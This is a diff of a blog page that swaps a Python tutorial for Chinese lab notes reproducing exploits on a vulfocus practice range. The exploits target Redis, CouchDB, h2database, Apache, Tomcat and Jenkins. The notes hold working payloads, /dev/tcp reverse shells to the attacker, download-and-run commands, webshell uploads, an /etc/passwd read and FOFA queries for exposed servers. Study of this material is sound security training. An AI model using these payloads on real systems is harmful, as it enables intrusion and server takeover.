@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="类的定义和使用 前情回顾 在上一节，我们学习了可以用类去封装属性，并基于类创建出一个个的对象来使用，然而实际上类还可以用来封装方法：\n1 2 3 4 class 类名称: 类的属性\t# 类的属性，即定义在类中的变量（成员变量） 类的行为 # 类的行为，即定义在类中的函数（成员方法） 示例：\n">
-<title>S1.2 类的成员方法</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" 安装vulfocus靶场，下载链接：https://pan.baidu.com/s/1wY6QmW5EmWaYm9u88nKF2w?pwd=d4ue\n并且下载服务器攻防工具：https://pan.baidu.com/s/1UxdruKscaAPK_DuSLQuhwg?pwd=qrwc\n启动靶场 登陆密码test123\n注： 靶场机ifconfig必须保证和攻击机网段一致（都开网桥或者都开NAT模式）\n">
+<title>1.26 漏洞复现</title>
 
-<link rel='canonical' href='https://www.retr0.xyz/p/s1.2-%E7%B1%BB%E7%9A%84%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95/'>
+<link rel='canonical' href='https://www.retr0.xyz/p/1.26-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/'>
 
-<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="S1.2 类的成员方法">
-<meta property='og:description' content="类的定义和使用 前情回顾 在上一节，我们学习了可以用类去封装属性，并基于类创建出一个个的对象来使用，然而实际上类还可以用来封装方法：\n1 2 3 4 class 类名称: 类的属性\t# 类的属性，即定义在类中的变量（成员变量） 类的行为 # 类的行为，即定义在类中的函数（成员方法） 示例：\n">
-<meta property='og:url' content='https://www.retr0.xyz/p/s1.2-%E7%B1%BB%E7%9A%84%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95/'>
+<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="1.26 漏洞复现">
+<meta property='og:description' content=" 安装vulfocus靶场，下载链接：https://pan.baidu.com/s/1wY6QmW5EmWaYm9u88nKF2w?pwd=d4ue\n并且下载服务器攻防工具：https://pan.baidu.com/s/1UxdruKscaAPK_DuSLQuhwg?pwd=qrwc\n启动靶场 登陆密码test123\n注： 靶场机ifconfig必须保证和攻击机网段一致（都开网桥或者都开NAT模式）\n">
+<meta property='og:url' content='https://www.retr0.xyz/p/1.26-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/'>
 <meta property='og:site_name' content='Retr0的小窝'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-12-14T22:06:09&#43;08:00'/><meta property='article:modified_time' content='2025-12-14T22:06:09&#43;08:00'/>
-<meta name="twitter:title" content="S1.2 类的成员方法">
-<meta name="twitter:description" content="类的定义和使用 前情回顾 在上一节，我们学习了可以用类去封装属性，并基于类创建出一个个的对象来使用，然而实际上类还可以用来封装方法：\n1 2 3 4 class 类名称: 类的属性\t# 类的属性，即定义在类中的变量（成员变量） 类的行为 # 类的行为，即定义在类中的函数（成员方法） 示例：\n">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-01-26T19:02:23&#43;08:00'/><meta property='article:modified_time' content='2026-01-26T19:02:23&#43;08:00'/>
+<meta name="twitter:title" content="1.26 漏洞复现">
+<meta name="twitter:description" content=" 安装vulfocus靶场，下载链接：https://pan.baidu.com/s/1wY6QmW5EmWaYm9u88nKF2w?pwd=d4ue\n并且下载服务器攻防工具：https://pan.baidu.com/s/1UxdruKscaAPK_DuSLQuhwg?pwd=qrwc\n启动靶场 登陆密码test123\n注： 靶场机ifconfig必须保证和攻击机网段一致（都开网桥或者都开NAT模式）\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
         <link rel="stylesheet" href="/css/APlayer.min.css">
@@ -319,10 +319,48 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#类的定义和使用">类的定义和使用</a>
+    <li><a href="#启动靶场">启动靶场</a></li>
+    <li><a href="#开始实验">开始实验</a>
       <ol>
-        <li><a href="#前情回顾">前情回顾</a></li>
-        <li><a href="#成员方法的定义语法">成员方法的定义语法</a></li>
+        <li><a href="#rediscve-2022-0543">Redis：CVE-2022-0543</a></li>
+        <li><a href="#rediscnvd-2015-07557">Redis：CNVD-2015-07557</a></li>
+        <li><a href="#rediscnvd-2019-21763">Redis：CNVD-2019-21763</a></li>
+        <li><a href="#couchdbcve-2017-12635权限绕过">Couchdb：CVE-2017-12635（权限绕过）</a></li>
+        <li><a href="#couchdbcve-2017-12635命令执行">Couchdb：CVE-2017-12635（命令执行）</a></li>
+        <li><a href="#h2databasecve-2022-23221">h2database：CVE-2022-23221</a>
+          <ol>
+            <li><a href="#漏洞一未授权进入">漏洞一：未授权进入</a></li>
+            <li><a href="#漏洞二rce执行反弹">漏洞二：RCE执行反弹</a></li>
+          </ol>
+        </li>
+        <li><a href="#apachecve-2021-42013">Apache：CVE-2021-42013</a></li>
+        <li><a href="#apachecve-2021-41773目录穿越">Apache：CVE-2021-41773（目录穿越）</a></li>
+        <li><a href="#tomcat-pass-getshell弱口令">tomcat-pass-getshell：弱口令</a></li>
+        <li><a href="#tomcatcve-2017-12615文件上传">tomcat：CVE-2017-12615（文件上传）</a></li>
+        <li><a href="#jenkinscve-2018-1000861">jenkins：CVE-2018-1000861</a></li>
+        <li><a href="#laravelcve-2021-3129rce">laravel：CVE-2021-3129（RCE）</a></li>
+        <li><a href="#thinkphp">thinkphp</a>
+          <ol>
+            <li><a href="#cve-2018-1002015">CVE-2018-1002015</a></li>
+            <li><a href="#cnvd-2018-24942">CNVD-2018-24942</a></li>
+          </ol>
+        </li>
+        <li><a href="#strutss2">struts（s2）</a>
+          <ol>
+            <li><a href="#struts2cve-2020-17530-代码执行-">struts2：CVE-2020-17530（ 代码执行 ）</a></li>
+          </ol>
+        </li>
+        <li><a href="#spring目录遍历">Spring（目录遍历）</a></li>
+        <li><a href="#solrcve-2019-17558命令执行">Solr：CVE-2019-17558（命令执行）</a></li>
+        <li><a href="#solrcve-2021-27905文件读取ssrf">Solr：CVE-2021-27905（文件读取&amp;SSRF）</a>
+          <ol>
+            <li><a href="#获取数据库名">获取数据库名</a></li>
+            <li><a href="#访问触发">访问触发</a></li>
+            <li><a href="#任意文件读取">任意文件读取</a></li>
+          </ol>
+        </li>
+        <li><a href="#shirocve-2016-4437命令执行">shiro：CVE-2016-4437(命令执行)</a></li>
+        <li><a href="#log4jcve-2021-44228远程命令执行">log4j：CVE-2021-44228（远程命令执行）</a></li>
       </ol>
     </li>
   </ol>
@@ -343,8 +381,12 @@
     
     <header class="article-category">
         
-            <a href="/categories/python/" style="background-color: #2A87D8; color: #fff;">
-                Python
+            <a href="/categories/%E7%BD%91%E5%AE%89/" style="background-color: #BEBDBD; color: #fff;">
+                网安
+            </a>
+        
+            <a href="/categories/26%E5%AF%92%E5%81%87%E9%9B%86%E8%AE%AD/" >
+                26寒假集训
             </a>
         
     </header>
@@ -352,7 +394,7 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/s1.2-%E7%B1%BB%E7%9A%84%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95/">S1.2 类的成员方法</a>
+            <a href="/p/1.26-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">1.26 漏洞复现</a>
         </h2>
     
         
@@ -374,7 +416,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025-12-14 | 22:06</time>
+                <time class="article-time--published">2026-01-26 | 19:02</time>
             </div>
         
 
@@ -397,24 +439,71 @@
     <section class="article-content">
     
     
-    <h2 id="类的定义和使用">类的定义和使用
-</h2><h3 id="前情回顾">前情回顾
-</h3><p>在上一节，我们学习了可以用类去封装属性，并基于类创建出一个个的对象来使用，然而实际上类还可以用来封装方法：</p>
+    <blockquote>
+<p>安装vulfocus靶场，下载链接：<a class="link" href="https://pan.baidu.com/s/1wY6QmW5EmWaYm9u88nKF2w?pwd=d4ue"  target="_blank" rel="noopener"
+    >https://pan.baidu.com/s/1wY6QmW5EmWaYm9u88nKF2w?pwd=d4ue</a></p>
+<p>并且下载服务器攻防工具：<a class="link" href="https://pan.baidu.com/s/1UxdruKscaAPK_DuSLQuhwg?pwd=qrwc"  target="_blank" rel="noopener"
+    >https://pan.baidu.com/s/1UxdruKscaAPK_DuSLQuhwg?pwd=qrwc</a></p>
+</blockquote>
+<h2 id="启动靶场">启动靶场
+</h2><p>登陆密码<code>test123</code></p>
+<p><strong>注：</strong> 靶场机ifconfig必须保证和攻击机网段一致（都开网桥或者都开NAT模式）</p>
+<p>终端执行</p>
+<p><code>sudo su</code>	输入登录密码</p>
+<p><code>docker ps -a</code></p>
+<p>发现9bda的虚拟机</p>
+<p><code>docker start 9bda</code></p>
+<h2 id="开始实验">开始实验
+</h2><p>在攻击机的浏览器中访问靶场的ip</p>
+<p>使用用户名:密码<code>admin:admin</code>登录</p>
+<p>镜像管理&ndash;镜像管理-一键同步</p>
+<p><strong>redis系列服务</strong></p>
+<p>默认端口<code>6379</code></p>
+<p>fofa搜索 <code>port=&quot;6379&quot; &amp;&amp; protocol=&quot;redis&quot;</code></p>
+<p>redis服务默认就是没有用户名和密码的</p>
+<p>找到服务攻防工具中的redis文件夹中的<strong>Another-Redis-Desktop-Manager</strong>并安装</p>
+<h3 id="rediscve-2022-0543">Redis：CVE-2022-0543
+</h3><p>在vulfocus中搜索该环境并启动，根据弹窗中的IP和端口使用刚才安装的软件连接数据库</p>
+<p>在软件中打开命令行模式，输入以下漏洞代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">eval &#39;local io_l = package.loadlib(&#34;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&#34;, &#34;luaopen_io&#34;); local io = io_l(); local f = io.popen(&#34;id&#34;, &#34;r&#34;); local res = f:read(&#34;*a&#34;); f:close(); return res&#39; 0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="rediscnvd-2015-07557">Redis：CNVD-2015-07557
+</h3><p>在服务攻防工具中的redis文件夹中找到<code>redis-rogue-server-master(CNVD-2015-07557).zip</code>复制到kali环境下解压，使用以下命令运行：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">类名称</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="n">类的属性</span>	<span class="c1"># 类的属性，即定义在类中的变量（成员变量）</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">类的行为</span> <span class="c1"># 类的行为，即定义在类中的函数（成员方法）</span>
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">chmod 777 -R ./*
+</span></span><span class="line"><span class="cl">python3 redis-rogue-server.py --rhost 目标IP --rport 目标端口 --lhost 攻击端口
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>示例：</p>
+</div><p>选择<strong>reverse shell</strong>反向连接</p>
+<p>192.168.0.106(攻击IP) 4444	此时kali开<code>nc -lvp 4444</code></p>
+<p>此时在nc可以使用一些Linux的命令</p>
+<h3 id="rediscnvd-2019-21763">Redis：CNVD-2019-21763
+</h3><p>同样将<code>redis-rogue-getshell(CNVD-2019-21763).zip</code>转移到kali环境，使用以下命令运行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">python3 redis-master.py -r 目标IP -p 目标端口 -L 攻击IP -P 8888 -f RedisModulesSDK/exp.so -c &#34;id&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="couchdbcve-2017-12635权限绕过">Couchdb：CVE-2017-12635（权限绕过）
+</h3><p>开源数据库，储存数据格式json，js查询语言</p>
+<p>数据库会开放3个端口，看谁会理你，就打谁</p>
+<hr>
+<p>1、先创建用户</p>
+<p>抓包并修改数据包</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -427,43 +516,40 @@
 </span><span class="lnt"> 8
 </span><span class="lnt"> 9
 </span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Student</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="kc">None</span>
-</span></span><span class="line"><span class="cl">    <span class="n">age</span> <span class="o">=</span> <span class="kc">None</span>
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">PUT /_users/org.couchdb.user:usertest1 HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 目标IP:端口
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Accept-Language: en
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Content-Type: application/json
+</span></span><span class="line"><span class="cl">Content-Length: 108
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">hi</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;大家好，我是</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="c1">##########</span>
-</span></span><span class="line"><span class="cl"><span class="n">stu</span> <span class="o">=</span> <span class="n">Student</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="n">stu</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;小明&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="n">stu</span><span class="o">.</span><span class="n">hi</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  &#34;type&#34;: &#34;user&#34;,
+</span></span><span class="line"><span class="cl">  &#34;name&#34;: &#34;usertest1&#34;,
+</span></span><span class="line"><span class="cl">  &#34;roles&#34;: [&#34;_admin&#34;],
+</span></span><span class="line"><span class="cl">  &#34;roles&#34;: [],
+</span></span><span class="line"><span class="cl">  &#34;password&#34;: &#34;usertest1&#34;
+</span></span><span class="line"><span class="cl">}
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>从今以后，我们就要称定义在类内部的函数为 <strong>方法</strong> 了。</p>
-<h3 id="成员方法的定义语法">成员方法的定义语法
-</h3><p>有些人肯定要问了：“上面的方法的代码里为什么有个<code>self</code>？”</p>
-<p>这就关系到它的定义语法了：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">方法名</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">形参1</span><span class="p">,</span><span class="n">形参2</span><span class="p">,</span><span class="o">......</span><span class="n">形参n</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">方法体</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>可以看到,在方法定义的参数列表中,有一个：self 关键字</p>
-<p>self 关键字是成员方法定义的时候，<font style="color:#DF2A3F;">必须填写</font>的。</p>
-<ul>
-<li>它用来表示类对象自身的意思</li>
-<li>当我们使用类对象调用方法的是,self会自动被python传入</li>
-<li><font style="color:#DF2A3F;">在方法内部，想要访问类的成员变量，必须使用self（见上方示例）</font></li>
-</ul>
-<p><strong>注意：self关键字虽然在参数列表中，但是传参的时候可以忽略</strong></p>
-<p>例如：</p>
+</div><p>浏览器网页返回<code>&quot;ok&quot;:true</code></p>
+<p>2、登录用户授权</p>
+<p><code>http://目标IP:端口/_utils/</code></p>
+<p>用户名密码</p>
+<p><code>usertest1:usertest1</code></p>
+<h3 id="couchdbcve-2017-12635命令执行">Couchdb：CVE-2017-12635（命令执行）
+</h3><p>在服务攻防工具中的couchdb文件夹中找到<code>couchdb.py</code>，同样复制到Kali环境。</p>
+<p>编辑该脚本，编辑目标的ip和端口和自己的ip，例如:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -481,22 +567,332 @@
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Student</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="kc">None</span>
-</span></span><span class="line"><span class="cl">    <span class="n">age</span> <span class="o">=</span> <span class="kc">None</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">env</span> <span class="n">python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">requests.auth</span> <span class="kn">import</span> <span class="n">HTTPBasicAuth</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">hi</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;大家好，我是</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">hello</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">msg</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;hello,大家好，</span><span class="si">{</span><span class="n">msg</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="c1">######</span>
-</span></span><span class="line"><span class="cl"><span class="n">stu</span> <span class="o">=</span> <span class="n">Student</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="n">stu</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;小王&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="n">stu</span><span class="o">.</span><span class="n">hi</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="n">stu</span><span class="o">.</span><span class="n">hello</span><span class="p">(</span><span class="s1">&#39;很高兴认识大家&#39;</span><span class="p">)</span>	<span class="c1"># 可以看到此处传参只传给了msg，不用理会self</span>
+</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;http://目标IP:端口&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="sa">rb</span><span class="s2">&#34;&#34;&#34;sh -i &gt;&amp; /dev/tcp/自己IP/9988 0&gt;&amp;1&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">version</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 以下省略</span>
 </span></span></code></pre></td></tr></table>
 </div>
+</div><p>先用nc监听9988端口</p>
+<p><code>nc -lvp 9988</code></p>
+<p>再执行<code>python couchdb.py</code></p>
+<p>此时目标会反弹shell到本地，可以在nc的终端页面执行命令</p>
+<h3 id="h2databasecve-2022-23221">h2database：CVE-2022-23221
+</h3><h4 id="漏洞一未授权进入">漏洞一：未授权进入
+</h4><p>在JDBC URL中填入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">jdbc</span><span class="p">:</span><span class="n">h2</span><span class="p">:</span><span class="n">mem</span><span class="p">:</span><span class="n">test1</span><span class="p">;</span><span class="n">FORBID_CREATION</span><span class="o">=</span><span class="n">FALSE</span><span class="p">;</span><span class="n">IGNORE_UNKNOWN_SETTINGS</span><span class="o">=</span><span class="n">TRUE</span><span class="p">;</span><span class="n">FORBID_CREATION</span><span class="o">=</span><span class="n">FALSE</span><span class="p">;</span>\
+</span></span></code></pre></td></tr></table>
 </div>
+</div><p>点击connect，直接进入了后台</p>
+<h4 id="漏洞二rce执行反弹">漏洞二：RCE执行反弹
+</h4><p>在攻击机上创建文件<code>h2database.sql</code>，内容为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">CREATE TABLE test (
+</span></span><span class="line"><span class="cl">  id INT NOT NULL
+</span></span><span class="line"><span class="cl">);
+</span></span><span class="line"><span class="cl">CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS &#39;//javascript
+</span></span><span class="line"><span class="cl">Java.type(&#34;java.lang.Runtime&#34;).getRuntime().exec(&#34;bash -c {echo,base64编码后的反弹指令}|{base64,-d}|{bash,-i}&#34;);&#39;;
+</span></span><span class="line"><span class="cl">#反弹指令示例：bash -i &gt;&amp; /dev/tcp/攻击IP/6666 0&gt;&amp;1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在当前文件夹中启动CMD，执行<code>python -m http.server</code></p>
+<p>启动nc监听6666端口，<code>nc -lvvp 6666</code></p>
+<p>在h2database的登录窗口的JDBC URL填入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">jdbc:h2:mem:test1;FORBID_CREATION=FALSE;IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;INIT=RUNSCRIPT FROM &#39;http://192.168.80.134:8000/h2database.sql&#39;;\
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>点击connect，观察到nc上已经拿到了目标上的root终端。</p>
+<h3 id="apachecve-2021-42013">Apache：CVE-2021-42013
+</h3><p>攻击端用nc监听5566端口，<code>nc -lvvp 5566</code></p>
+<p>使用hackbarPOST一段内容，同时用burp抓包</p>
+<p>修改数据包头（也就是第一行）：<code>POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh</code></p>
+<p>修改下方的POST内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">echo;perl -e &#39;use Socket;$i=&#34;攻击IP&#34;;$p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="apachecve-2021-41773目录穿越">Apache：CVE-2021-41773（目录穿越）
+</h3><p>fafa搜索<code>server=&quot;Apache/2.4.49&quot;</code></p>
+<blockquote>
+<p>Apache HTTP Server 2.4.49、2.4.50版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到Web目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。</p>
+</blockquote>
+<p>使用Kali执行下面的命令即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -v --path-as-is <span class="s1">&#39;http://目标IP:端口/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="tomcat-pass-getshell弱口令">tomcat-pass-getshell：弱口令
+</h3><blockquote>
+<p>配置不当导致后台弱口令，可通过上传jsp压缩包改名的war拿shell</p>
+<ul>
+<li>先爆破弱口令</li>
+<li>后门压缩zip改war</li>
+<li>上传war访问链接</li>
+</ul>
+</blockquote>
+<p>打开网站，点击<strong>manageapp</strong>，用户名密码都是tomcat或者admin</p>
+<p>发现<strong>WAR file to deploy</strong></p>
+<p>哥斯拉生成jsp木马(有效载荷是JavaDynamicPayload)，压缩为zip，改名为<code>a1.war</code></p>
+<p>之后发现网站有一个/a1</p>
+<p>地址为<code>http://目标IP:端口/a1/a1.jsp</code></p>
+<p>哥斯拉（ONE-FOX集成工具箱）连接即可（记得选相同的有效载荷）</p>
+<h3 id="tomcatcve-2017-12615文件上传">tomcat：CVE-2017-12615（文件上传）
+</h3><p>burp直接首页抓包，改为PUT，内容为从文件粘贴jsp木马的代码</p>
+<p><code>PUT /x.jsp/ </code></p>
+<p><code>PUT /xx.jsp%20</code></p>
+<p><code>PUT /xxx.jsp::$DATA</code></p>
+<p>之后木马就在<code>http://目标IP:端口/xxx.jsp</code></p>
+<h3 id="jenkinscve-2018-1000861">jenkins：CVE-2018-1000861
+</h3><p>在<code>服务攻防\jenkins\CVE-2018-1000861</code>创建<code>shell.txt</code>内容为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/攻击IP/5566 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>随后在同目录下执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python -m http.server <span class="m">8888</span>
+</span></span><span class="line"><span class="cl">python2 exp.py http://目标IP:端口/ <span class="s2">&#34;curl -o /tmp/1.sh http://攻击IP:8888/shell.txt&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此时目标的/tmp/1.sh有了</p>
+<p>攻击端使用nc监听<code>nc -lvvp 5566</code></p>
+<p>接着在刚才的目录执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python2 exp.py http://192.168.142.129:62408/ <span class="s2">&#34;bash /tmp/1.sh&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="laravelcve-2021-3129rce">laravel：CVE-2021-3129（RCE）
+</h3><p>要求：Laravel &lt;= 8.4.2</p>
